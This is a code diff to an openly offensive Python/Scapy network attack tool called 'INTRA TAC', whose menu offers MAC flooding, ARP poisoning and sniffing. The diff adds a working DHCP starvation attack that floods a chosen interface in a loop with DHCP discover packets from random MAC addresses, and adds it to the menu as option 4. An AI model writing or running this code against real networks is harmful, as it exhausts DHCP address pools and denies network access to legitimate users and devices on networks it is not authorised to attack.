@@ -1,5 +1,8 @@
 from scapy.all import *
 import pyfiglet
+from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf
+from time import sleep
+import ipaddress
 result = pyfiglet.figlet_format("INTRA TAC")
 print(result)
 
@@ -99,9 +102,28 @@ def sniffer():
             print(e)
 
 
+def dhcp_starv():
+
+    i = input("Enter the network interface for the attack: ")
+
+    conf.checkIPaddr = False
+
+    dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) \
+                    / IP(src='0.0.0.0', dst='255.255.255.255') \
+                    / UDP(sport=68, dport=67) \
+                    / BOOTP(op=1, chaddr=RandMAC()) \
+                    / DHCP(options=[('message-type', 'discover'), ('end')])
+
+    print("Attack has begun....")
+    sendp(dhcp_discover, iface=i, loop=1, verbose=1)
+    print("Attack stopped..")
+
+
+
+
 
 print("attacks available: ")
-print("1.) MAC flooding \n2.) ARP poisoning \n3.) Sniffing network traffic")
+print("1.) MAC flooding \n2.) ARP poisoning \n3.) Sniffing network traffic \n4.) DHCP starvation attack")
 
 a = input("choose an offensive option: ")
 if a=='1':
@@ -119,5 +141,6 @@ if a =='2':
 if a =='3':
     sniffer()
 
-
+if a =='4':
+    dhcp_starv()
 
